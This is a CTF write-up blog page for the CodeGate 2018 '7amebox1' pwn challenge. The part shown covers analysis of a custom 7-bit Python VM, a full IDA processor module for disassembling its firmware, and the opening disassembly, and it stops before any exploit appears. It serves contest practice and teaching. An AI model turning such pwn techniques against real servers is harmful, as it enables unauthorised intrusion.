

  
    
  


  





  

<!DOCTYPE html>
<html lang="en-us">
  <head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Hugo 0.37 with theme Tranquilpeak 0.4.3-BETA">
    <title>CodeGate 2018 7amebox1 Writeup</title>
    <meta name="author" content="Team-Eur3kA">
    <meta name="keywords" content="codegate, codegate-2018, writeup">

    <link rel="icon" href="https://Team-Eur3kA.github.io/favicon.png">
    

    
    <meta name="description" content="">
    <meta property="og:description" content="">
    <meta property="og:type" content="blog">
    <meta property="og:title" content="CodeGate 2018 7amebox1 Writeup">
    <meta property="og:url" content="/2018/02/codegate-2018-7amebox1-writeup/">
    <meta property="og:site_name" content="Team-Eur3kA Blog">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Team-Eur3kA Blog">
    <meta name="twitter:description" content="">
    
    

    
    

    
      <meta property="og:image" content="https://farscapedevelopment.files.wordpress.com/2012/07/eureka.gif">
    

    
      <meta property="og:image" content="https://ctftime.org/media/cache/72/e3/72e30fa751acf026cda1e67366dedc3e.png">
    
    
      <meta property="og:image" content="//d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city.jpg">
    
    

    

    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
    
    
    <link rel="stylesheet" href="https://Team-Eur3kA.github.io/css/style-jsjn0006wyhpyzivf6yceb31gvpjatbcs3qzjvlumobfnugccvobqwxnnaj8.min.css" />
    
    

    
      
    
    
  </head>

  <body>
    <div id="blog">
      <header id="header" data-behavior="4">
  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
  <div class="header-title">
    <a class="header-title-link" href="https://Team-Eur3kA.github.io/">Team-Eur3kA Blog</a>
  </div>
  
    
      <a class="header-right-picture "
         href="https://Team-Eur3kA.github.io/#about">
    
    
    
      
        <img class="header-picture" src="https://farscapedevelopment.files.wordpress.com/2012/07/eureka.gif" alt="Author&#39;s picture" />
      
    
    </a>
  
</header>

      <nav id="sidebar" data-behavior="4">
  <div class="sidebar-container">
    
      <div class="sidebar-profile">
        <a href="https://Team-Eur3kA.github.io/#about">
          <img class="sidebar-profile-picture" src="https://farscapedevelopment.files.wordpress.com/2012/07/eureka.gif" alt="Author&#39;s picture" />
        </a>
        <h4 class="sidebar-profile-name">Team-Eur3kA</h4>
        
          <h5 class="sidebar-profile-bio">CTF Security Team Eur3kA deriving from former united team FFF-PKyou which consists of members from multiple united team FFF and Peking University team PKyou</h5>
        
      </div>
    
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/">
    
      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
      
      <span class="sidebar-button-desc">Home</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/categories">
    
      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
      
      <span class="sidebar-button-desc">Categories</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/tags">
    
      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
      
      <span class="sidebar-button-desc">Tags</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/archives">
    
      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
      
      <span class="sidebar-button-desc">Archives</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/#about">
    
      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
      
      <span class="sidebar-button-desc">About</span>
    </a>
  </li>


    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://github.com/kakawait" target="_blank" rel="noopener">
    
      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
      
      <span class="sidebar-button-desc">GitHub</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://stackoverflow.com/users/636472/kakawait" target="_blank" rel="noopener">
    
      <i class="sidebar-button-icon fa fa-lg fa-stack-overflow"></i>
      
      <span class="sidebar-button-desc">Stack Overflow</span>
    </a>
  </li>


    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/index.xml">
    
      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
      
      <span class="sidebar-button-desc">RSS</span>
    </a>
  </li>


    </ul>
  </div>
</nav>

      
  <div class="post-header-cover
              text-center
              "
       style="background-image:url('//d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city.jpg')"
       data-behavior="4">
    
      <div class="post-header main-content-wrap text-center">
  
    <h1 class="post-title" itemprop="headline">
      CodeGate 2018 7amebox1 Writeup
    </h1>
  
  
  <div class="postShorten-meta post-meta">
    
      <time itemprop="datePublished" datetime="2018-02-06T00:00:00Z">
        
  February 6, 2018

      </time>
    
    
  
  
    <span>in</span>
    
      <a class="category-link" href="https://Team-Eur3kA.github.io/categories/codegate">codegate</a>, 
    
      <a class="category-link" href="https://Team-Eur3kA.github.io/categories/codegate-2018">codegate-2018</a>, 
    
      <a class="category-link" href="https://Team-Eur3kA.github.io/categories/writeup">writeup</a>
    
  

  </div>

</div>
    
  </div>


      <div id="main" data-behavior="4"
        class="hasCover
               hasCoverMetaIn
               ">
        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
          
          
          <div class="post-content markdown" itemprop="articleBody">
            <div class="main-content-wrap">
              <p></p>

<h1 id="codegate-2018-7amebox1-writeup">CodeGate 2018 7amebox1 Writeup</h1>

<h2 id="first-impression">First impression</h2>

<p>By unzipping the package we get a <code>_7amebox.py</code> python script, a <code>vm_name.py</code> script, an <code>mic_check.firm</code> and a <code>flag</code> which is obviously fake flag.</p>

<p>Since it is a pwn challenge, our goal is to read the flag on the server. By analysising a little bit,we are able to understand that the <code>_7amebox.py</code> is a virtual machine written in pure python. Since python code is very easy to read, I&rsquo;ll just skip the python analysis details.</p>

<p>So, what we are able to get from the virtual machine source code is that, we have 31 operations(instructions), naming from <code>x0</code> to <code>x30</code>. <code>x8</code> is a special one, since it is a syscall instruction. And we also have 6 syscalls naming from <code>s0</code> to <code>s5</code>. Handlers are all defined in the <code>__init__</code> part of the class <code>EMU</code>. The special part of this virtual machine is that, like the <code>cLEMENCY</code> virtual machine, this one is not regarding 8 bits to be a byte! But unlike clemency, it uses 7 bits as a byte, and 21 bits to be a &ldquo;dword&rdquo;(may not called dword though). To translate 3 bytes into a &ldquo;dword&rdquo;, it uses a special method just like clemency defined in <code>EMU</code>&rsquo;s <code>read_memory_tri</code>. Well, since the python source code is given, we can edit a lot on the source code to dump the internal data of processing procedure.So, I actually haven&rsquo;t really studied this part, I just dumped some of the values and find the pattern. :P
So the pack part is like this:</p>

<pre><code>def pack_num(num):
    binary = bin(num)[2:].rjust(21, '0')
    lists = []
    for i in range(3):
        lists.append(chr(int(binary[:7], 2)))
        binary = binary[7:]
    return lists[-1] + lists[0] + lists[1]
</code></pre>

<h2 id="ida-processor-part">IDA processor part</h2>

<p>To achieve the final goal of this challenge, we first need to disassemble the firmware, which is the mentioned <code>mic_check.firm</code>. This is done by writing a little IDA processor. You can do this by hand, I mean, write a disassembler though.</p>

<p>I havn&rsquo;t implemented many features since I need to do this quickly. The <code>ref</code> part is totally jumped over. So this is a really bad processor you can write.</p>

<pre><code>from idaapi import *

TYPE_R = 0
TYPE_I = 1

CODE_DEFAULT_BASE = 0x00000
STACK_DEFAULT_BASE = 0xf4000
ERRORS = -1

FL_INDIRECT = 0x000000800  # This is an indirect access (not immediate value)
FL_ABSOLUTE = 1  # absolute: &amp;addr
class DecodingError(Exception):
    pass

class Inst:
    command = 0
    oprand1 = 0
    oprand2 = 0
    oprand3 = 0

class MyProcessor(processor_t):
    id = 0x8000 + 8888
    flag = PR_ADJSEGS | PRN_HEX
    cnbits = 8
    dnbits = 8
    author = &quot;Anciety&quot;
    psnames = [&quot;G7amebox&quot;]
    plnames = [&quot;G7amebox&quot;]
    segreg_size = 0
    instruc_start = 0
    assembler = {
        &quot;flag&quot;: AS_NCHRE | ASH_HEXF4 | ASD_DECF1 | ASO_OCTF3 | ASB_BINF2
              | AS_NOTAB,
        &quot;uflag&quot;: 0,
        &quot;name&quot;: &quot;My assembler&quot;,
        &quot;origin&quot;: &quot;.org&quot;,
        &quot;end&quot;: &quot;.end&quot;,
        &quot;cmnt&quot;: &quot;;&quot;,
        &quot;ascsep&quot;: '&quot;',
        &quot;accsep&quot;: &quot;'&quot;,
        &quot;esccodes&quot;: &quot;\&quot;'&quot;,
        &quot;a_ascii&quot;: &quot;.ascii&quot;,
        &quot;a_byte&quot;: &quot;.byte&quot;,
        &quot;a_word&quot;: &quot;.word&quot;,
        &quot;a_bss&quot;: &quot;dfs %s&quot;,
        &quot;a_seg&quot;: &quot;seg&quot;,
        &quot;a_curip&quot;: &quot;PC&quot;,
        &quot;a_public&quot;: &quot;&quot;,
        &quot;a_weak&quot;: &quot;&quot;,
        &quot;a_extrn&quot;: &quot;.extern&quot;,
        &quot;a_comdef&quot;: &quot;&quot;,
        &quot;a_align&quot;: &quot;.align&quot;,
        &quot;lbrace&quot;: &quot;(&quot;,
        &quot;rbrace&quot;: &quot;)&quot;,
        &quot;a_mod&quot;: &quot;%&quot;,
        &quot;a_band&quot;: &quot;&amp;&quot;,
        &quot;a_bor&quot;: &quot;|&quot;,
        &quot;a_xor&quot;: &quot;^&quot;,
        &quot;a_bnot&quot;: &quot;~&quot;,
        &quot;a_shl&quot;: &quot;&lt;&lt;&quot;,
        &quot;a_shr&quot;: &quot;&gt;&gt;&quot;,
        &quot;a_sizeof_fmt&quot;: &quot;size %s&quot;,
    }

    reg_names = regNames = [
        &quot;r0&quot;, &quot;r1&quot;, &quot;r2&quot;, &quot;r3&quot;, &quot;r4&quot;,
        &quot;r5&quot;, &quot;r6&quot;, &quot;r7&quot;, &quot;r8&quot;, &quot;r9&quot;, 'r10', 'bp',
        'sp', 'pc', 'eflags', 'zero', 'CS', 'DS'
    ]

    instruc = instrs = [
        {'name': 'x0_lea', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x1_leab', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x2_movtomr', 'feature': CF_USE1 | CF_USE2},
        {'name': 'x3_movtomrb', 'feature': CF_USE1 | CF_USE2},
        {'name': 'x4_movrX', 'feature': CF_USE1 | CF_USE2 | CF_CHG2},
        {'name': 'x5_swap', 'feature': CF_USE1 | CF_USE2 | CF_CHG1 | CF_CHG2},
        {'name': 'x6_pushX', 'feature': CF_USE1},
        {'name': 'x7_popr', 'feature': CF_USE1 | CF_CHG1},
        {'name': 'x8_syscall', 'feature': 0},
        {'name': 'x9_addX', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x10_addb', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x11_subX', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x12_subb', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x13_shr', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x14_shl', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x15_mul', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x16_div', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x17_inc', 'feature': CF_USE1 | CF_CHG1},
        {'name': 'x18_dec', 'feature': CF_USE1 | CF_CHG1},
        {'name': 'x19_and', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x20_or', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x21_xor', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x22_mod', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x23_cmp', 'feature': CF_USE1 | CF_USE2},
        {'name': 'x24_cmpb', 'feature': CF_USE1 | CF_USE2},
        {'name': 'x25_jgt', 'feature': CF_USE1 | CF_USE2 | CF_JUMP},
        {'name': 'x26_jle', 'feature': CF_USE1 | CF_USE2 | CF_JUMP},
        {'name': 'x27_jz', 'feature': CF_USE1 | CF_USE2 | CF_JUMP},
        {'name': 'x28_jnz', 'feature': CF_USE1 | CF_USE2 | CF_JUMP},
        {'name': 'x29_jmp', 'feature': CF_USE1 | CF_USE2 | CF_JUMP},
        {'name': 'x30_call', 'feature': CF_USE1 | CF_USE2 | CF_CALL},

    ]
    instruc_end = len(instruc)
    curInst = Inst()
    def __init__(self):
        processor_t.__init__(self)
        self._init_instructions()
        self._init_registers()

    def _init_instructions(self):
        self.inames = {}
        for idx, ins in enumerate(self.instrs):
            print(idx, ins)
            self.inames[ins['name'].split('_')[0]] = idx

    def _init_registers(self):
        self.reg_ids = {}
        for i, reg in enumerate(self.reg_names):
            self.reg_ids[reg] = i
        self.reg_first_sreg = self.reg_code_sreg = self.reg_ids[&quot;CS&quot;]
        self.reg_last_sreg = self.reg_data_sreg = self.reg_ids[&quot;DS&quot;]


    def bit_concat(self, bit_list):
        res = 0
        for bit in bit_list:
            res &lt;&lt;= 7
            res += bit &amp; 0b1111111
        return res

    def _read_memory(self, insn, length):
        ea = insn.ea + insn.size
        mem = []
        for i in range(length):
            mem.append(get_full_byte(ea + i))
        insn.size += length
        return mem
    def read_memory_tri(self, addr, count):
        if not count:
            return []
        
        res = []
        for i in range(count):
            tri = 0
            tri |= get_full_byte(addr + i*3)
            tri |= get_full_byte(addr +i*3 + 1) &lt;&lt; 14
            tri |= get_full_byte(addr + i*3 + 2) &lt;&lt; 7
            res.append(tri)
        return res

    def _set_insn_type(self, insn, typ, dtyp):
        insn.type = typ
        insn.dtyp = dtyp

    def _set_insn_reg(self, insn, dtyp, reg):
        self._set_insn_type(insn, o_reg, dtyp)
        insn.reg = reg

    def _set_insn_imm(self, insn, dtyp, value):
        self._set_insn_type(insn, o_imm, dtyp)
        insn.value = value

    def _set_insn_near(self, insn, dtyp, addr):
        self._set_insn_type(insn, o_near, dtyp)
        insn.addr = addr

    def _set_insn_phrase(self, insn, dtyp, phrase):
        self._set_insn_type(insn, o_phrase, dtyp)
        insn.phrase = phrase


    def _read_three_op(self,name,insn):
        insn.itype = self.inames[name]
        insn[0].type = o_reg
        insn[0].dtyp = dt_byte
        insn[0].reg = self._read_byte(insn)
        insn[1].type = o_reg
        insn[1].dtyp = dt_byte
        insn[1].reg = self._read_byte(insn)
        insn[2].type = o_reg
        insn[2].dtyp = dt_byte
        insn[2].reg = self._read_byte(insn)
    
    def _read_two_op_rr(self,name,insn):
        insn.itype = self.inames[name]
        insn[0].type = o_reg
        insn[0].dtyp = dt_byte
        insn[0].reg = self._read_byte(insn)
        insn[1].type = o_reg
        insn[1].dtyp = dt_byte
        insn[1].reg = self._read_byte(insn)

    def _read_two_op_ri(self,name,insn):
        insn.itype = self.inames[name]
        insn[0].type = o_reg
        insn[0].dtyp = dt_byte
        insn[0].reg = self._read_byte(insn)
        insn[1].type = o_imm
        insn[1].dtyp = dt_dword
        insn[1].value = self._read_dword(insn)
    def _read_two_op_ir(self,name,insn):
        insn.itype = self.inames[name]
        insn[0].type = o_imm
        insn[0].dtyp = dt_dword
        insn[0].reg = self._read_dword(insn)
        insn[1].type = o_reg
        insn[1].dtyp = dt_byte
        insn[1].value = self._read_byte(insn)
    def _read_one_op_r(self,name,insn):
        insn.itype = self.inames[name]
        insn[0].type = o_reg
        insn[0].dtyp = dt_byte
        insn[0].reg = self._read_byte(insn)

    def _read_one_op_i(self,name,insn):
        insn.itype = self.inames[name]
        insn[0].type = o_imm
        insn[0].dtyp = dt_dword
        insn[0].reg = self._read_dword(insn)

    def _ana_jmp_abs(self,name,insn):
        insn.itype = self.inames[name]
        addr = self._read_dword(insn)
        insn[0].type = o_near
        insn[0].dtyp = dt_dword
        insn[0].addr = addr


    def _ana_jmp_rel_reg(self,name,insn):
        insn.itype = self.inames[name]
        insn[0].type = o_reg
        insn[0].dtyp = dt_byte
        insn[0].reg = self._read_byte(insn)

    def _ana(self,insn):
        insn.size = 0
        opcode = self.bit_concat(self._read_memory(insn, 2))
        op = (opcode &amp; 0b11111000000000) &gt;&gt; 9
        if op &gt;= 31:
            raise DecodingError('invalid instruction')

        op_type = (opcode &amp; 0b00000100000000) &gt;&gt; 8

        opers = []
        if op_type == TYPE_R:
            opers.append((opcode &amp; 0b00000011110000) &gt;&gt; 4)
            opers.append((opcode &amp; 0b00000000001111))
            op_size = 2

        elif op_type == TYPE_I:
            opers.append((opcode &amp; 0b00000011110000) &gt;&gt; 4)
            addr = insn.ea
            opers.append(self.read_memory_tri(addr+2, 1)[0])
            op_size = 5

        else:
            raise DecodingError(&quot;[VM] Invalid instruction&quot;)

        def invalid_ins():
            raise DecodingError('invalid instruction addr {} op {} op_type {} opers {}'.format(insn.ea, op, op_type, opers))

        if op == 0:
            insn.itype = self.inames['x0']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_phrase(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 1:
            insn.itype = self.inames['x1']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[1], dt_byte, opers[1])
                self._set_insn_reg(insn[0], dt_byte, opers[0])
            else:
                invalid_ins()
                
        elif op == 2:
            insn.itype = self.inames['x2']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_phrase(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 3:
            insn.itype = self.inames['x3']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_byte, opers[0])
                self._set_insn_phrase(insn[1], dt_byte, opers[1])
            else:
                invalid_ins()
        elif op == 4:
            insn.itype = self.inames['x4']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 5:
            insn.itype = self.inames['x5']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 6:
            insn.itype = self.inames['x6']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[0], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 7:
            insn.itype = self.inames['x7']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 9:
            insn.itype = self.inames['x9']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 10:
            insn.itype = self.inames['x10']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_byte, opers[0])
                self._set_insn_reg(insn[1], dt_byte, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_byte, opers[1])
                self._set_insn_reg(insn[0], dt_byte, opers[0])
            else:
                invalid_ins()
        elif op == 11:
            insn.itype = self.inames['x11']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 12:
            insn.itype = self.inames['x12']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_byte, opers[0])
                self._set_insn_reg(insn[1], dt_byte, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_byte, opers[1])
                self._set_insn_reg(insn[0], dt_byte, opers[0])
            else:
                invalid_ins()
        elif op == 13:
            insn.itype = self.inames['x13']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 14:
            insn.itype = self.inames['x14']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 15:
            insn.itype = self.inames['x15']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 16:
            insn.itype = self.inames['x16']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 17:
            insn.itype = self.inames['x17']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 18:
            insn.itype = self.inames['x18']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 19:
            insn.itype = self.inames['x19']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 20:
            insn.itype = self.inames['x20']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 21:
            insn.itype = self.inames['x21']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 22:
            insn.itype = self.inames['x22']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 23:
            insn.itype = self.inames['x23']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 24:
            insn.itype = self.inames['x24']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_byte, opers[0])
                self._set_insn_reg(insn[1], dt_byte, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_byte, opers[1])
                self._set_insn_reg(insn[0], dt_byte, opers[0])
            else:
                invalid_ins()
        elif op == 25:
            insn.itype = self.inames['x25']
            if op_type == TYPE_R:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_imm(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 26:
            insn.itype = self.inames['x26']
            if op_type == TYPE_R:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_imm(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 27:
            insn.itype = self.inames['x27']
            if op_type == TYPE_R:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_imm(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 28:
            insn.itype = self.inames['x28']
            if op_type == TYPE_R:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_imm(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 29:
            insn.itype = self.inames['x29']
            if op_type == TYPE_R:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_imm(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 30:
            insn.itype = self.inames['x30']
            if op_type == TYPE_R:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_imm(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 8:
            insn.itype = self.inames['x8']
        else:
            invalid_ins()

        insn.size = op_size
        return insn.size

    def notify_ana(self,insn):
        try:
            return self._ana(insn)
        except DecodingError as e:
            print(e)
            return 0

    def _emu_operand(self,op,insn):
        if op.type == o_mem:
            insn.create_op_data(0, op.addr, op.dtyp)
            insn.add_dref(op.addr, 0, dr_R)
        elif op.type == o_near:
            if insn.get_canon_feature() &amp; CF_CALL:
                fl = fl_CN
            else:
                fl = fl_JN
            insn.add_cref(op.addr, 0, fl)

    def notify_emu(self,insn):
        ft = insn.get_canon_feature()
        if ft &amp; CF_USE1:
            self._emu_operand(insn[0],insn)
        if ft &amp; CF_USE2:
            self._emu_operand(insn[1],insn)
        if ft &amp; CF_USE3:
            self._emu_operand(insn[2],insn)
        if ft &amp; CF_USE4:
            self._emu_operand(insn[3],insn)
        if not ft &amp; CF_STOP:
            insn.add_cref(insn.ea + insn.size, 0, fl_F)
        return True
    
    def notify_out_operand(self, outctx, op):
        if op.type == o_reg:
            if op.specval == FL_INDIRECT:
                outctx.out_symbol('[')
            outctx.out_register(self.reg_names[op.reg])
            if op.specval == FL_INDIRECT:
                outctx.out_symbol(']')
        elif op.type == o_imm:
            outctx.out_value(op, OOFW_IMM)
        elif op.type == o_phrase:
            outctx.out_symbol('[')
            outctx.out_register(self.reg_names[op.phrase])
            outctx.out_symbol(']')
        elif op.type in [o_near, o_mem]:
            ok = outctx.out_name_expr(op, op.addr, BADADDR)
            if not ok:
                outctx.out_tagon(COLOR_ERROR)
                outctx.out_long(op.addr, 16)
                outctx.out_tagoff(COLOR_ERROR)
                queue_mark(Q_noName, insn.ea)
        else:
            return False
        return True

    def notify_out_insn(self,outctx):
        insn=outctx.insn
        ft = insn.get_canon_feature()
        outctx.out_mnem()
        if ft &amp; CF_USE1:
            outctx.out_one_operand(0)
        if ft &amp; CF_USE2:
            outctx.out_char(',')
            outctx.out_char(' ')
            outctx.out_one_operand(1)
        if ft &amp; CF_USE3:
            outctx.out_char(',')
            outctx.out_char(' ')
            outctx.out_one_operand(2)
        outctx.flush_outbuf()
        cvar.gl_comm = 1
     
def PROCESSOR_ENTRY():
    return MyProcessor()
</code></pre>

<h2 id="disassmeble">Disassmeble</h2>

<p>Then we are able to disassemble the firmware in ida now.
And it looks like so:</p>

<pre><code>ROM:0000 ; Segment type: Pure code
ROM:0000                 x30_call [pc], $4
ROM:0005                 x21_xor r0, r0
ROM:0007                 x8_syscall
ROM:0009                 x6_pushX bp             ; func main
ROM:000B                 x4_movrX bp, sp
ROM:000D                 x11_subX sp, $3C        ; stack - 0x3c
